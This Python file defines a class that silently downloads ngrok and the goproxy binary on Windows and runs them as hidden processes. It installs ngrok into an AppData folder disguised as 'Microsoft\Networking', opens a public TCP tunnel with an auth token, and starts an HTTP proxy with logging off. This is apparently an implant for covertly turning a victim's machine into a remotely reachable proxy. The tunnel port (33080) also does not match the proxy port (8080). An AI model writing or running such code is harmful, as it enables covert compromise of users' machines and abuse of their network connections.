import os
import tempfile
import requests
import zipfile
import tarfile
import shutil
import subprocess
import re
import time
import threading
import psutil


class NgrokProxyManager:
    def __init__(self, ngrok_token):
        self.ngrok_token = ngrok_token
        self.ngrok_process = None
        self.proxy_process = None
        self.ngrok_thread = None
        self.proxy_thread = None
        self.local_appdata = os.getenv('LOCALAPPDATA')
        self.ngrok_dir = os.path.join(self.local_appdata, 'Microsoft', 'Networking')
        self.proxy_dir = None
        self.ngrok_url = None
        self.stop_event = threading.Event()

    def install_ngrok(self):
        """Install ngrok if not already installed."""
        if not os.path.exists(self.ngrok_dir):
            os.makedirs(self.ngrok_dir, exist_ok=True)

            r = requests.get('https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip', stream=True)
            r.raise_for_status()
            zip_path = tempfile.NamedTemporaryFile(suffix='.zip', delete=False).name

            with open(zip_path, "wb") as f:
                f.write(r.content)

            with zipfile.ZipFile(zip_path, "r") as zip_ref:
                zip_ref.extractall(self.ngrok_dir)

            os.remove(zip_path)

        self.ngrok_exe = os.path.join(self.ngrok_dir, 'ngrok.exe')

        # Configure ngrok with the provided authentication token
        subprocess.run(
            [self.ngrok_exe, 'config', 'add-authtoken', self.ngrok_token],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            startupinfo=self._get_startupinfo()
        )

    def _get_startupinfo(self):
        """Suppress command prompt windows for subprocesses."""
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        return startupinfo

    def start_ngrok_tunnel(self):
        """Start the ngrok tunnel."""
        def ngrok_runner():
            self.ngrok_process = subprocess.Popen(
                [self.ngrok_exe, 'tcp', '33080'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                text=True,
                startupinfo=self._get_startupinfo()
            )

            # Give ngrok some time to establish the tunnel
            time.sleep(5)

            # Query ngrok's local API to get tunnel information
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels')
                response.raise_for_status()
                tunnels = response.json().get('tunnels', [])
                for tunnel in tunnels:
                    if tunnel['proto'] == 'tcp':
                        public_url = tunnel['public_url']
                        tcp_match = re.match(r'tcp://(.*):(\d+)', public_url)
                        if tcp_match:
                            ip_address = tcp_match.group(1)
                            port = tcp_match.group(2)
                            self.ngrok_url = f'{ip_address}:{port}'
                            print(f'Ngrok URL: {self.ngrok_url}')
            except requests.RequestException as e:
                print(f"Error accessing ngrok API: {e}")

        self.ngrok_thread = threading.Thread(target=ngrok_runner, daemon=True)
        self.ngrok_thread.start()

    def download_and_run_proxy(self):
        """Download and run the proxy server."""
        def proxy_runner():
            # Download the proxy tarball
            url = 'https://github.com/snail007/goproxy/releases/download/v14.7/proxy-windows-amd64.tar.gz'
            r = requests.get(url, stream=True)
            r.raise_for_status()
            tar_path = tempfile.NamedTemporaryFile(suffix='.tar.gz', delete=False).name

            with open(tar_path, "wb") as f:
                f.write(r.content)

            # Extract the tar.gz to a temporary directory
            self.proxy_dir = tempfile.mkdtemp()
            with tarfile.open(tar_path, "r:gz") as tar_ref:
                tar_ref.extractall(self.proxy_dir)

            os.remove(tar_path)

            # Run proxy.exe silently
            proxy_exe = os.path.join(self.proxy_dir, 'proxy.exe')
            self.proxy_process = subprocess.Popen(
                [proxy_exe, 'http', '-p', '127.0.0.1:8080', '--nolog'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                text=True,
                startupinfo=self._get_startupinfo()
            )

        self.proxy_thread = threading.Thread(target=proxy_runner, daemon=True)
        self.proxy_thread.start()

    def start_all(self):
        """Install ngrok, start ngrok tunnel, and run the proxy."""
        self.install_ngrok()
        self.start_ngrok_tunnel()
        self.download_and_run_proxy()
        # Wait for ngrok to set up the URL
        time.sleep(10)
        return self.ngrok_url

    def stop_all(self):
        """Stop all services and clean up."""
        self.stop_event.set()

        # Terminate ngrok process
        self._terminate_process("ngrok.exe")

        # Terminate proxy process
        self._terminate_process("proxy.exe")

        # Clean up proxy directory
        if self.proxy_dir and os.path.exists(self.proxy_dir):
            shutil.rmtree(self.proxy_dir)
            print("Temporary proxy directory cleaned up.")

    def _terminate_process(self, process_name):
        """Terminate all processes with the given name."""
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].lower() == process_name:
                    proc.terminate()
                    proc.wait(timeout=5)
                    print(f"Terminated: {process_name}")
            except Exception as e:
                print(f"Failed to terminate {process_name}: {e}")
